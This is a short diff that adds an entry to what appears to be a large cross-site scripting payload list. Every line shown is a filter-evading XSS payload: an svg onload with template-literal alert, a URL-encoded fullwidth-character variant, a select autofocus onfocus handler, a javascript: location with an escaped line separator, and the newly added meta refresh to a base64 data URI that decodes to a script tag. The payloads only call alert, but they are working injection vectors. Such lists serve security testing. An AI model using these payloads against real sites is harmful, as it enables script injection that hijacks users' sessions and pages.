@@ -2204,3 +2204,4 @@ location='javascript://\u2028alert(1)';
 <svg/onload=setTimeout`alert\`1\``>
 %CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert(1)%EF%BC%9E 
 <select autofocus onfocus=alert`1`
+<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
